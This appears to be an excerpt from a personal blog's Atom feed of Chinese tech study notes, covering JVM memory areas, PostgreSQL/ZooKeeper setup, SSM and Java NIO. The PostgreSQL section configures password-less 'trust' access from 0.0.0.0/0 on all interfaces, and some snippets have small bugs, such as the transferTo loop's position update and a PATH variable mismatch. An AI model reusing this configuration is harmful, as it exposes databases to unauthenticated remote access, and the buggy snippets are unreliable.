Stack）用于管理本地方法的调用，本地方法栈也是线程私有的。</font></p><p>本地方法：使用native关键字修饰的方法，由C/C++实现。</p><p>本地方法栈的大小和异常种类和普通的JVM栈是相同的，允许被实现成固定大小或者动态扩展的，溢出和OOM都有可能存在。</p><p>本地方法栈的具体做法就是执行本地方法时，在本地方法栈中压入本地方法，然后让执行引擎从本地方法库中加载这个本地方法，再让本地方法执行，最后本地方法栈栈顶元素出栈。</p><p><strong>本地方法接口</strong>就是本地方法运行时和JVM沟通的接口，<strong>本地方法库</strong>就是java所有本地方法的集合。</p><p><font color="Red">当某个线程调用本地方法时，本地方法执行的权限和JVM有着相同的权限。</font></p><ul><li>本地方法可以通过本地方法接口来访问JMV内部的运行时数据区。</li><li>本地方法可以直接使用本地处理器中的寄存器</li><li>本地方法可以直接从本地内存堆中分配任意数量的内存。</li></ul><p>并不是所有的JVM都支持本地方法，因为JVM规范中并没有明确要求本地方法栈的使用语言、具体实现方式、数据结构等，如果JVM产品不打算支持本地方法，那么无需实现本地方法栈也是可以的。</p><p>在HotSpot JVM中，直接将JVM栈和本地方法栈合二为一。</p><h3 id="6、JVM堆"><a href="#6、JVM堆" class="headerlink" title="6、JVM堆"></a>6、JVM堆</h3><ul><li><p>堆是JVM进程私有的，一个JVM进程只有一个堆内存，堆也是JVM内存管理的核心区域。</p></li><li><p>堆内存的大小是可以调节的。</p></li><li><p>JVM规范规定，堆可以处于物理上不连续的内存空间中，但在逻辑上他应该被视为连续的。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;JVM版本：HotSpot 1.8&lt;/p&gt;
&lt;p&gt;推荐书籍：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;《The Java Virtual Machine Specification》（&lt;a href=&quot;https://docs.oracle.com/javase/specs/jvms/s</summary>
      
    
    
    
    <category term="java" scheme="https://yury757.github.io/categories/java/"/>
    
    
  </entry>
  
  <entry>
    <title>postgresql</title>
    <link href="https://yury757.github.io/database/postgresql/postgresql"/>
    <id>https://yury757.github.io/database/postgresql/postgresql</id>
    <published>2021-09-10T16:00:00.000Z</published>
    <updated>2021-10-31T18:45:23.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、postgresql安装部署"><a href="#一、postgresql安装部署" class="headerlink" title="一、postgresql安装部署"></a>一、postgresql安装部署</h2><p>postgresql版本：11.13</p><p>源码下载路径（最好下载源码，自己编译）：<a href="https://www.postgresql.org/ftp/source/v11.13/">PostgreSQL: File Browser</a></p><p>安装过程：</p><pre><code class="shell"># 下载wget https://ftp.postgresql.org/pub/source/v11.13/postgresql-11.13.tar.gztar -xzf postgresql-11.13.tar.gzcd postgresql-11.13.tar.gz# 安装./configure# 上面一步可能会出现library not found问题，安装对应的lib即可，经常碰到需要安装以下两个lib：# sudo apt install libreadline-dev# sudo apt install zlib1g-devmake# 上面这一步如果成功后会显示：All of PostgreSQL successfully made. Ready to install.sudo make install# 上面这一步成功后会显示：Postgresql installation complete，默认安装在/usr/local/pgsql目录下</code></pre><p>配置：</p><pre><code class="shell">cd /usr/local/pgsqlsudo mkdir datasudo chown yury /usr/local/pgsql/data # 修改data目录的所有者为yury，或者你自己新建的postgresql用户# 创建环境变量，将以下两行写入/etc/profile文件中export PGHOME=/usr/local/pgsqlexport PGDATA=/usr/local/pgsql/dataexport PATH=$&#123;PATH&#125;:$&#123;PG_HOME&#125;/bin# 重新加载环境变量source /etc/profile</code></pre><p>初始化数据库：</p><pre><code class="shell">cd /usr/local/pgsqlbin/initdb# 出现以下输出时，说明初始化成功# Success. You can now start the database server using:#     bin/pg_ctl -D /usr/local/pgsql/data -l logfile start# 启动数据库bin/pg_ctl start# 创建一个postgres用户bin/createuser postgres# 以postgres用户登录bin/psql postgres# 修改当前用户（postgres）的密码\password</code></pre><p>配置网络以便其他客户端可以连接：</p><pre><code class="shell">vi bin/pg_hba.conf# 修改下面这一行为第二行的值# host    all    127.0.0.1/32    trust# host    all    0.0.0.0/0       trustvi bin/postgresql.conf# 修改下面这一行为第二行的值，并且取消注释这个配置# listen_addresses = &#39;127.0.0.1&#39;# listen_addresses = &#39;*&#39;bin/pg_ctl restart # 重启服务</code></pre><h2 id="二、MySQL安装部署"><a href="#二、MySQL安装部署" class="headerlink" title="二、MySQL安装部署"></a>二、MySQL安装部署</h2><p>MySQL版本：8.0.25</p><p>使用apt安装</p><p>数据库目录：/var/lib/mysql/</p><p>配置文件：/usr/share/mysql-8.0（命令及配置文件），/etc/mysql（如my.cnf）</p><p>相关命令：/usr/bin（mysqladmin、mysqldump等命令）和/usr/sbin</p><p>启动脚本：/etc/init.d/mysql（启动脚本文件mysql的目录）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、postgresql安装部署&quot;&gt;&lt;a href=&quot;#一、postgresql安装部署&quot; class=&quot;headerlink&quot; title=&quot;一、postgresql安装部署&quot;&gt;&lt;/a&gt;一、postgresql安装部署&lt;/h2&gt;&lt;p&gt;postgresql版本：1</summary>
      
    
    
    
    <category term="postgresql" scheme="https://yury757.github.io/categories/postgresql/"/>
    
    
  </entry>
  
  <entry>
    <title>zookeeper-study</title>
    <link href="https://yury757.github.io/bigdata/zookeeper/zookeeper-study"/>
    <id>https://yury757.github.io/bigdata/zookeeper/zookeeper-study</id>
    <published>2021-08-27T16:00:00.000Z</published>
    <updated>2021-10-31T18:41:55.328Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、Zookeeper介绍"><a href="#一、Zookeeper介绍" class="headerlink" title="一、Zookeeper介绍"></a>一、Zookeeper介绍</h2><h3 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h3><p>zookeeper是一个分布式数据一致性解决方案，致力于为分布式应用提供一个高性能、高可能，且具有严格顺序访问控制能力的分布式<strong>协调</strong>存储服务。提供的功能包括：<strong>配置维护、域名服务、分布式同步、组服务</strong>等。</p><p>zookeeper是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。</p><h2 id="二、下载安装"><a href="#二、下载安装" class="headerlink" title="二、下载安装"></a>二、下载安装</h2><p>地址：<a href="https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/">Index of /apache/zookeeper (tsinghua.edu.cn)</a></p><pre><code class="shell">cd /home/yurywget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.6.3/apache-zookeeper-3.6.3-bin.tar.gz# 解压tar xzvf apache-zookeeper-3.6.3-bin.tar.gz# 将文件夹重命名为zookeeper-3.6.3-bin方便使用mkdir zookeeper-3.6.3-bin/mv -f apache-zookeeper-3.6.3-bin/* zookeeper-3.6.3-bin/# 使用这个目录作为根目录cd zookeeper-3.6.3-bin</code></pre><p>将以下配置写入一个新建的文件：<code>vi /conf/zoo.cfg</code></p><pre><code class="shell"># ZooKeeper使用的基本时间单位（毫秒）。 它用于做心跳，并且最小会话超时将是tickTime的两倍。tickTime=2000# 除非另有说明，否则存储内存中数据库快照的位置以及数据库更新的事务日志dataDir=/home/yury/zookeeper-3.6.3-bin/zookeeper-data# 客户端访问的端口clientPort=2181</code></pre><h2 id="三、单机模式"><a href="#三、单机模式" class="headerlink" title="三、单机模式"></a>三、单机模式</h2><pre><code class="shell"># 启动bin/zkServer.sh start# 查看运行状态bin/zkServer.sh status# ZooKeeper JMX enabled by default# Using config: /home/yury/zookeeper-3.6.3-bin/bin/../conf/zoo.cfg# Client port found: 2181. Client address: localhost. Client SSL: false.# Mode: standalone# 使用命令行连接到服务器bin/zkCli.sh -server localhost:2181# jps命令，需要手动安装jps16722 Jps16365 QuorumPeerMain</code></pre><h2 id="四、分布式模式"><a href="#四、分布式模式" class="headerlink" title="四、分布式模式"></a>四、分布式模式</h2><p>官方文档建议使用奇数个服务器。 如果只有两台服务器，那么您将处于一种情况，如果其中一台服务器发生故障，则没有足够的计算机构成多数仲裁。由于存在两个单点故障，因此两个服务器本来就不如单个服务器稳定。因此我们创建3台服务器。</p><p>修改之前创建的那个配置文件，新增以下内容：</p><pre><code class="shell"># initLimit is timeouts ZooKeeper uses to limit the length of time the ZooKeeper servers in quorum have to connect to a leader.initLimit=5# syncLimit limits how far out of date a server can be from a leader# 这几个时间都是以上面那个tickTime为单位时间syncLimit=2# server.N是指第N台服务器# A=B:C:D，其中B位置是ip，或者ip的别名，在hosts中可以为ip设置别名解析# 服务器使用前一个端口连接到其他服务器。ZooKeeper服务器使用此端口将follower连接到leader。当出现新的leader时，follower使用此端口打开与leader的TCP连接。由于leader选举时默认使用TCP，因此我们当前需要另一个端口来进行leader选举。这是配置中的第二个端口。server.1=192.168.0.201:2888:3888server.2=192.168.0.202:2888:3888server.3=192.168.0.203:2888:3888</code></pre><pre><code class="shell"># 将配置文件拷贝到其他服务器scp ./conf/* yury@192.168.141.142:/home/yury/zookeeper-3.6.3-bin/conf/scp ./conf/* yury@192.168.141.143:/home/yury/zookeeper-3.6.3-bin/conf/</code></pre><p><font color="Red">注意：最后还要在上面的<code>dataDir</code>目录下新建一个<code>myid</code>的文件，写入本台服务器的数字id，如第2台服务器，只需要放一个数字2进去即可。</font></p><p>启动之后查看服务器状态，结果如下，其中141和142服务器的mode为follower，而143服务器的mode为leader，这是由分布式系统投票决定的，不是我们定义的。    </p><pre><code class="shell">ZooKeeper JMX enabled by defaultUsing config: /home/yury/zookeeper-3.6.3-bin/bin/../conf/zoo.cfgClient port found: 2181. Client address: localhost. Client SSL: false.Mode: follower</code></pre><p>搭好了之后，像上面一样用zkCli.sh命令连接随意连接一台服务器，创建节点，修改节点，会发现，三台服务器均会做相应修改。</p><h2 id="五、使用"><a href="#五、使用" class="headerlink" title="五、使用"></a>五、使用</h2><p>zkServer.sh脚本的功能如下</p><p>Usage: bin/zkServer.sh [–config &lt;conf-dir&gt;] {start|start-foreground|stop|version|restart|status|print-cmd}</p><h3 id="1、zkCli-sh命令"><a href="#1、zkCli-sh命令" class="headerlink" title="1、zkCli.sh命令"></a>1、zkCli.sh命令</h3><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>help</td><td>帮助</td></tr><tr><td>ls /path</td><td>/path为节点路径，如：ls /zookeeper<br>-w 注册监听子节点路径变化，如果其他客户端修改该节点的值，或删除该节点，则可以收到通知。<font color="Red">但是有一个缺陷，这个监听只能监控到一次变化， 如果还需要继续监控，需要继续注册。</font></td></tr><tr><td>create /path [value]</td><td>创建节点，如：create /zktest mydata</td></tr><tr><td>get /path</td><td>获取节点的值，如：get /zktest<br>-w 注册监听节点的变化，监听效果同上<br>-s 获取节点信息</td></tr><tr><td>set /path value</td><td>设置节点的值，如：set /zktest junk</td></tr><tr><td>delete /path</td><td>删除节点（如果该节点下面非空，即有子节点，则无法删除），如：delete /zktest</td></tr><tr><td>deleteall /path</td><td>递归删除节点（会删除所有子节点）</td></tr><tr><td>quit</td><td>退出</td></tr></tbody></table><h3 id="2、节点类型"><a href="#2、节点类型" class="headerlink" title="2、节点类型"></a>2、节点类型</h3><p>持久、短暂、有序号、无序号</p><p>待完善。</p><h3 id="3、API使用"><a href="#3、API使用" class="headerlink" title="3、API使用"></a>3、API使用</h3><h2 id="六、分布式理论"><a href="#六、分布式理论" class="headerlink" title="六、分布式理论"></a>六、分布式理论</h2><h3 id="1、CAP理论"><a href="#1、CAP理论" class="headerlink" title="1、CAP理论"></a>1、CAP理论</h3><p>CAP 理论指出对于一个分布式计算系统来说，不可能同时满足以下三点：</p><ul><li><p><strong>一致性（Consistency）</strong>：在分布式环境中，一致性是指数据在多个副本之间是否能够保持一致的特性，等同于所有节点访问同一份最新的数据副本。在一致性的需求下，当一个系统在数据一致的状态下执行更新操作后，应该保证系统的数据仍然处于一致的状态。</p></li><li><p><strong>可用性（Availability）</strong>：每次请求都能获取到正确的响应，但是不保证获取的数据为最新数据。</p></li><li><p><strong>分区容错性（Partition Tolerance）</strong>：分布式系统在遇到任何网络分区故障的时候，仍然需要能够保证对外提供满足一致性和可用性的服务，除非是整个网络环境都发生了故障。</p></li></ul><p><img src="/images/CAP%E7%90%86%E8%AE%BA.png"></p><p>一个分布式系统最多只能同时满足一致性（Consistency）、可用性（Availability）和分区容错性（Partition tolerance）这三项中的两项。</p><p>在这三个基本需求中，最多只能同时满足其中的两项，P 是必须的，因此只能在 CP 和 AP 中选择，zookeeper 保证的是 CP，对比 spring cloud 系统中的注册中心 eruka 实现的是 AP。</p><h3 id="2、BASE理论"><a href="#2、BASE理论" class="headerlink" title="2、BASE理论"></a>2、BASE理论</h3><p>BASE是Basically Available（基本可用）、Soft-state（软状态）和Eventually Consistent（最终一致性）三个短语的缩写。</p><ul><li><strong>基本可用：</strong>在分布式系统出现故障，允许损失部分可用性（服务降级、页面降级）。</li><li><strong>软状态：</strong>允许分布式系统出现中间状态。而且中间状态不影响系统的可用性。这里的中间状态是指不同的 data replication（数据备份节点）之间的数据更新可以出现延时的最终一致性。</li><li><strong>最终一致性：</strong>data replications 经过一段时间达到一致性。</li></ul><p>BASE 理论是对 CAP 中的一致性和可用性进行一个权衡的结果，理论的核心思想就是：我们无法做到强一致，但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性。</p><p>五、分布式一致性</p><p><img src="/images/%E4%B8%80%E8%87%B4%E6%80%A7.png"></p><p>1、强一致性：用户更新了value后，服务器先把数据同步到其他服务器，再将“更新成功”的消息返回给用户，即这两个操作是同步的，也可以说<strong>服务器的主从复制是同步的</strong>，则用户不管读那台服务器都是更新后的值。</p><p>2、弱一致性：用户更新了value后，服务器把数据同步到其他服务器和将“更新成功”的消息返回给用户这两个操作是异步的，也可以说<strong>服务器的主从复制是异步的</strong>，因此用户读取时可能会读到旧的数据。</p><p>3、半同步：保证一台从服务器是同步的，其他从服务器则是异步的，如果同步的从服务器出现问题，则让另外一台异步服务器来做同步。即始终保证有两个节点拥有完整数据。</p><p>3、最终一致性，最终一致性其实还是弱一致性，只不过用户看到的旧数据只是一个暂时的状态，如果等待一段时间，从服务器最终会和主服务器数据一致，这就是最终一致性。数据同步的速度受很多因素影响，一般都比较快，即这个等待延迟一般很短。</p><h2 id="七、选举机制"><a href="#七、选举机制" class="headerlink" title="七、选举机制"></a>七、选举机制</h2><p>1、半数机制。集群中半数以上机器存活，集群可用。所以zookeeper适合安装奇数台服务器。</p><p>2、zookeeper虽然在配置文件中没有指定leader和follower，但是在集群启动后，zookeeper会通过内部选举产生临时的leader和follower。</p><h2 id="八、监听器"><a href="#八、监听器" class="headerlink" title="八、监听器"></a>八、监听器</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、Zookeeper介绍&quot;&gt;&lt;a href=&quot;#一、Zookeeper介绍&quot; class=&quot;headerlink&quot; title=&quot;一、Zookeeper介绍&quot;&gt;&lt;/a&gt;一、Zookeeper介绍&lt;/h2&gt;&lt;h3 id=&quot;1、简介&quot;&gt;&lt;a href=&quot;#1、简介&quot;</summary>
      
    
    
    
    <category term="bigdata" scheme="https://yury757.github.io/categories/bigdata/"/>
    
    <category term="zookeeper" scheme="https://yury757.github.io/categories/bigdata/zookeeper/"/>
    
    
  </entry>
  
  <entry>
    <title>SSM-Build</title>
    <link href="https://yury757.github.io/java/SSM-Build/SSM-Build"/>
    <id>https://yury757.github.io/java/SSM-Build/SSM-Build</id>
    <published>2021-08-23T16:00:00.000Z</published>
    <updated>2021-08-24T09:04:06.151Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSM框架整合"><a href="#SSM框架整合" class="headerlink" title="SSM框架整合"></a>SSM框架整合</h2><p>1、web.xml中配置DispatcherServlet时的初始化参数要连接所有的spring配置文件。先当与配置文件从web.xml是一个顶点，然后依次往下细分。</p><p>2、排错方法：</p><ul><li>使用IDEA查看bean和MVC的细节</li><li>Junit单元测试</li></ul><p>3、即使类上面加了<code>@RestController</code>，springmvc不会自动帮你把对象转字符串再返回给前端，这时若方法返回的是对象或List接口或其他则会报错<code>No converter found for return value of type: class java.util.ArrayList</code>。若导入了<code>jackson-databind</code>包，则会自动帮你把对象或列表转字符串，就可以直接返回一个对象了。</p><pre><code class="java">@RequestMapping(&quot;/a2&quot;)public List&lt;User&gt; a2()&#123;    List&lt;User&gt; userList = new ArrayList&lt;&gt;();    userList.add(new User(&quot;yury757&quot;, 18, &quot;男&quot;));    userList.add(new User(&quot;name1&quot;, 28, &quot;男&quot;));    userList.add(new User(&quot;name2&quot;, 38, &quot;女&quot;));    userList.add(new User(&quot;name3&quot;, 48, &quot;男&quot;));    return userList;&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SSM框架整合&quot;&gt;&lt;a href=&quot;#SSM框架整合&quot; class=&quot;headerlink&quot; title=&quot;SSM框架整合&quot;&gt;&lt;/a&gt;SSM框架整合&lt;/h2&gt;&lt;p&gt;1、web.xml中配置DispatcherServlet时的初始化参数要连接所有的spring配置</summary>
      
    
    
    
    <category term="java" scheme="https://yury757.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://yury757.github.io/tags/java/"/>
    
    <category term="spring" scheme="https://yury757.github.io/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>Java_NIO-study</title>
    <link href="https://yury757.github.io/java/java_NIO/Java_NIO-study"/>
    <id>https://yury757.github.io/java/java_NIO/Java_NIO-study</id>
    <published>2021-08-23T16:00:00.000Z</published>
    <updated>2021-08-28T05:50:37.102Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、NIO和IO的区别"><a href="#一、NIO和IO的区别" class="headerlink" title="一、NIO和IO的区别"></a>一、NIO和IO的区别</h2><ul><li><p>传统IO面向流，而NIO面向管道（channel）和缓冲区（buffer）。传统IO只能单向传输数据，而NIO可以双向传输数据。传统IO就像单向水管，而NIO中channel像列车轨道，buffer就像火车，可以双向传输数据。</p></li><li><p>传统IO是阻塞（blocking）的，而NIO就是非阻塞（Non blocking）的。</p></li><li><p>NIO多了一个选择器（Selector），是针对网络编程用的。</p></li></ul><h2 id="二、缓冲区（Buffer）"><a href="#二、缓冲区（Buffer）" class="headerlink" title="二、缓冲区（Buffer）"></a>二、缓冲区（Buffer）</h2><p>缓冲区（Buffer）是基于数组来做管理的，负责存取数据。java NIO有七种xxxBuffer类，都继承了Buffer类，即八种基本数据类型中，除了boolean以外都提供了对应的xxxBuffer。</p><pre><code class="java">ByteBufferCharBufferShortBufferIntBufferLongBufferFloatBufferDoubleBuffer</code></pre><p>每种xxxBuffer类还不是最终实现类，最终的实现类有两种，以下以ByteBuffer为例：</p><pre><code class="java">// 属于下面说的直接缓冲区，不懂操作系统的人最好不要使用，有风险class DirectByteBufferR extends DirectByteBuffer implements DirectBuffer&#123;&#125;// 常用这个实现类class HeapByteBuffer extends ByteBuffer&#123;&#125;</code></pre><h3 id="1、四个核心属性"><a href="#1、四个核心属性" class="headerlink" title="1、四个核心属性"></a>1、四个核心属性</h3><pre><code class="java">// 容量，缓冲区总的最大容量int capacity;// 最大可读写的容量int limit;// 位置，表示缓冲区中正在操作的数据的下标。当position&lt;limit，可以做写入操作，当position=limit时，写入操作会报错。int position;// 标记位置，默认为-1int mark = -1;// mark &lt; position &lt; limit &lt; capacity</code></pre><h3 id="2、主要方法"><a href="#2、主要方法" class="headerlink" title="2、主要方法"></a>2、主要方法</h3><p>下面以ByteBuffer为例：</p><pre><code class="java">// 分配缓冲区public static ByteBuffer allocate(int capacity);// 存入数据到缓冲区中public abstract ByteBuffer put(byte b);// 读取数据public abstract byte get(int index);// 将缓冲区的数据读取到另外一个数组中public ByteBuffer get(byte[] dst, int offset, int length);// 切换到读取数据的模式。将limit的值置为当前position的值，再把position归0public final Buffer flip() &#123;        limit = position;        position = 0;        mark = -1;        return this;&#125;// 恢复到初始状态，注意数据还在，只是被遗忘了public final Buffer clear() &#123;        position = 0;        limit = capacity;        mark = -1;        return this;&#125;// 将position恢复到上一次mark标记的位置public final Buffer reset() &#123;        int m = mark;        if (m &lt; 0)            throw new InvalidMarkException();        position = m;        return this;&#125;</code></pre><p><font color="Red">注意：<code>public ByteBufferget(byte[] dst, int offset, int length)</code>方法参数中的offset和length不是针对源buffer，而是针对新数组dst的！！</font></p><h3 id="3、非直接缓冲区"><a href="#3、非直接缓冲区" class="headerlink" title="3、非直接缓冲区"></a>3、非直接缓冲区</h3><p><img src="/images/%E9%9D%9E%E7%9B%B4%E6%8E%A5%E7%BC%93%E5%86%B2%E5%8C%BA.png"></p><h3 id="4、直接缓冲区"><a href="#4、直接缓冲区" class="headerlink" title="4、直接缓冲区"></a>4、直接缓冲区</h3><p><img src="/images/%E7%9B%B4%E6%8E%A5%E7%BC%93%E5%86%B2%E5%8C%BA.png"></p><p><strong>优点</strong>：效率更高！</p><p><strong>缺点：</strong>消耗资源大，数据写入到物理内存中后不受java控制，垃圾回收也有一定的问题。</p><p><img src="/images/%E7%9B%B4%E6%8E%A5%E7%BC%93%E5%86%B2%E5%8C%BA%E5%92%8C%E9%9D%9E%E7%9B%B4%E6%8E%A5%E7%BC%93%E5%86%B2%E5%8C%BA.png"></p><h2 id="三、通道（Channel）"><a href="#三、通道（Channel）" class="headerlink" title="三、通道（Channel）"></a>三、通道（Channel）</h2><p>之前进行IO操作，是通过CPU授权给DMA（Direct Memory Access）总线，然后在DMA总线的管理下进行IO操作。而Channel则是一种独立的专门处理IO操作的特殊的（协）处理器，具有自己的IO指令，进行IO操作时不需要CPU授权。</p><p><img src="/images/%E9%80%9A%E9%81%93.png"></p><h3 id="1、接口和实现类"><a href="#1、接口和实现类" class="headerlink" title="1、接口和实现类"></a>1、接口和实现类</h3><p>接口：</p><p>java.nio.Channels.Channel</p><p>实现类：</p><ul><li>FileChannel：本地数据IO</li><li>SocketChannel：TCP连接用</li><li>ServerSocketChannel：TCP连接用</li><li>DatagramChannel：UDP连接用</li></ul><h3 id="2、获取通道的三种方式"><a href="#2、获取通道的三种方式" class="headerlink" title="2、获取通道的三种方式"></a>2、获取通道的三种方式</h3><h4 id="（1）各个支持通道的IO类提供了相应的getChannel方法"><a href="#（1）各个支持通道的IO类提供了相应的getChannel方法" class="headerlink" title="（1）各个支持通道的IO类提供了相应的getChannel方法"></a>（1）各个支持通道的IO类提供了相应的getChannel方法</h4><pre><code class="java">@Testpublic void test02() &#123;    try(// 获取流        FileInputStream fis = new FileInputStream(filename1);        FileOutputStream fos = new FileOutputStream(filename2);        // 获取对应的通道        FileChannel fisChannel = fis.getChannel();        FileChannel fosChannel = fos.getChannel();)    &#123;        // 通过非直接缓冲区方式        ByteBuffer buffer = ByteBuffer.allocate(1024);        // 将源数据通道的数据写入缓冲区        while (fisChannel.read(buffer) != -1)&#123;            // 切换成读取模式            buffer.flip();            // 读取缓冲区中的数据，写入目标数据通道            fosChannel.write(buffer);            // 清空缓冲区            buffer.clear();        &#125;    &#125;catch (Exception ex)&#123;        ex.printStackTrace();    &#125;    // 使用try()&#123;&#125;的方式就可以不用关闭，否则就要关闭所有的流和通道    //        fosChannel.close();    //        fisChannel.close();    //        fis.close();    //        fos.close();&#125;</code></pre><h4 id="（2）使用open函数"><a href="#（2）使用open函数" class="headerlink" title="（2）使用open函数"></a>（2）使用open函数</h4><pre><code class="java">@Testpublic void test03() &#123;    Date startTime = new Date();    // 通过open的方式获取通道    // CREATE_NEW：当文件存在时会报错    // CREATE：当文件存在时，会在原文件上从头开始覆盖写入。    // 但是很奇怪，当使用CREATE和直接缓冲区结合的方式时，当source文件的字节数小于destination文件的字节数时，并不会发生写入操作。    // 即一般使用CREATE_NEW就行    try(FileChannel fisChannel = FileChannel.open(Paths.get(filename1), StandardOpenOption.READ);        FileChannel fosChannel = FileChannel.open(Paths.get(filename2), StandardOpenOption.WRITE, StandardOpenOption.READ, StandardOpenOption.CREATE_NEW))    &#123;        // 使用非直接缓冲区        ByteBuffer buffer = ByteBuffer.allocate(8 * 1024 * 1024);        while (fisChannel.read(buffer) != -1)&#123;            buffer.flip();            fosChannel.write(buffer);            buffer.clear();        &#125;        /*            // 通过直接缓冲区方式            MappedByteBuffer inMappedBuffer = fisChannel.map(FileChannel.MapMode.READ_ONLY, 0, fisChannel.size());            MappedByteBuffer outMappedBuffer = fosChannel.map(FileChannel.MapMode.READ_WRITE, 0, fisChannel.size());            // 对直接缓冲区中的数据进行读写，因此省略了从OS地址空间到JVM地址空间的copy操作            // 使用内存映射文件时，就是将一个硬盘上的文件通过通道映射到物理内存的缓冲区中，当缓冲区有put操作，则会直接将对应的数据写入硬盘            byte[] dst = new byte[inMappedBuffer.limit()];            inMappedBuffer.get(dst);            outMappedBuffer.put(dst); */        // 关闭通道，同样如果使用了try()&#123;&#125;则不用关闭        //            fisChannel.close();        //            fosChannel.close();    &#125;catch (Exception ex)&#123;        ex.printStackTrace();    &#125;    Date endTime = new Date();    System.out.println(&quot;time: &quot; + (endTime.getTime() - startTime.getTime()) / 1000 + &quot;秒&quot;);&#125;</code></pre><p><font color="Red">注意！！使用Channel.transferTo方法时，一次传输最大传输支持2G，如果文件超过2G，则要断点传输！如下：</font></p><pre><code class="java">@Testpublic void test04()&#123;    Date startTime = new Date();    try(FileChannel fisChannel = FileChannel.open(Paths.get(filename1), StandardOpenOption.READ);        FileChannel fosChannel = FileChannel.open(Paths.get(filename2), StandardOpenOption.WRITE, StandardOpenOption.READ, StandardOpenOption.CREATE_NEW))    &#123;        // 通过transferTo，也是通过直接缓冲区的方式        // transferTo一次传输最大2G，因此无论文件大小的化，最好使用以下方式        long position = 0;        long len = fisChannel.size();        while (0 &lt; len)&#123;            long l = fisChannel.transferTo(position, len, fosChannel);            if (l &gt; 0)&#123;                position = l;                len -= l;            &#125;        &#125;    &#125;catch (Exception ex)&#123;        ex.printStackTrace();    &#125;    Date endTime = new Date();    System.out.println(&quot;time: &quot; + (endTime.getTime() - startTime.getTime()) / 1000 + &quot;秒&quot;);&#125;</code></pre><h4 id="（3）通过Files创建"><a href="#（3）通过Files创建" class="headerlink" title="（3）通过Files创建"></a>（3）通过Files创建</h4><pre><code class="java">Files.newByteChannel();</code></pre><h3 id="3、聚集和分散"><a href="#3、聚集和分散" class="headerlink" title="3、聚集和分散"></a>3、聚集和分散</h3><p>分散读取（Scattering Reads）：读取文件时按顺序填入多个缓冲区中，前面的缓冲区填满了，再填后面的缓冲区</p><p>聚集写入（Gathering Writes）：将多个缓冲区中的数据按顺序写入到通道中</p><p>即就是将channel写入一个bytebuffer数组中，或者从一个bytebuffer数组中读取数据到channel。</p><p><img src="/images/%E8%81%9A%E9%9B%86%E5%92%8C%E5%88%86%E6%95%A3.png"></p><pre><code class="java">@Testpublic void test05()&#123;    try(RandomAccessFile raf = new RandomAccessFile(filename1, &quot;r&quot;);        FileChannel channel = raf.getChannel();        RandomAccessFile raf2 = new RandomAccessFile(filename2, &quot;rw&quot;);        FileChannel channel2 = raf2.getChannel();        )    &#123;        System.out.println(&quot;=======分散读取======&quot;);        ByteBuffer buffer1 = ByteBuffer.allocate(10);        ByteBuffer buffer2 = ByteBuffer.allocate(1024);        // 写入缓冲区        ByteBuffer[] buffers = &#123;buffer1, buffer2&#125;;        channel.read(buffers);        // 将缓冲区切换成读取模式        for (ByteBuffer buffer : buffers) &#123;            buffer.flip();        &#125;        // 将缓冲区中的内容打印出来        System.out.println(new String(buffers[0].array(), 0, buffers[0].limit()));        System.out.println(&quot;=============&quot;);        System.out.println(new String(buffers[1].array(), 0, buffers[1].limit()));        System.out.println(&quot;=======聚集写入======&quot;);        channel2.write(buffers);    &#125;catch (Exception ex)&#123;        ex.printStackTrace();    &#125;&#125;</code></pre><h2 id="四、字符集（Charset）"><a href="#四、字符集（Charset）" class="headerlink" title="四、字符集（Charset）"></a>四、字符集（Charset）</h2><p>编码：字符串 =&gt; 字节数组</p><p>解码：字节数组 =&gt; 字符串</p><pre><code class="java">@Testpublic void test01()&#123;    final SortedMap&lt;String, Charset&gt; stringCharsetSortedMap = Charset.availableCharsets();    stringCharsetSortedMap.forEach((key, value) -&gt; &#123;        System.out.println(key.getClass().getName());        System.out.println(value.getClass().getName());        System.out.println(key + &quot;: &quot; + value);    &#125;);&#125;</code></pre><p>获取一个字符集的类，并得到他们的编码器和解码器：</p><pre><code class="java">Charset gbk = Charset.forName(&quot;GBK&quot;);CharsetEncoder charsetEncoder = gbk.newEncoder();CharsetDecoder charsetDecoder = gbk.newDecoder();</code></pre><p>encode方法得到一个ByteBuffer，而decode方法得到一个CharBuffer：</p><pre><code class="java">@Testpublic void test02() throws Exception&#123;    final Charset gbk = Charset.forName(&quot;GBK&quot;);    final CharsetEncoder charsetEncoder = gbk.newEncoder();    final CharsetDecoder charsetDecoder = gbk.newDecoder();    CharBuffer charBuffer = CharBuffer.allocate(1024);    charBuffer.put(&quot;你好，世界！hello, world!!&quot;);    charBuffer.flip();    ByteBuffer byteBuffer = charsetEncoder.encode(charBuffer);    for (int i = 0; i &lt; byteBuffer.limit(); i++) &#123;        System.out.print(byteBuffer.get() + &quot; &quot;);    &#125;    System.out.println();    byteBuffer.flip();    CharBuffer charBuffer2 = charsetDecoder.decode(byteBuffer);    for (int i = 0; i &lt; charBuffer2.limit(); i++) &#123;        System.out.print(charBuffer2.get() + &quot; &quot;);    &#125;    System.out.println();    charBuffer2.flip();    System.out.println(charBuffer2.toString());&#125;</code></pre><h2 id="五、阻塞和非阻塞（重点！！）"><a href="#五、阻塞和非阻塞（重点！！）" class="headerlink" 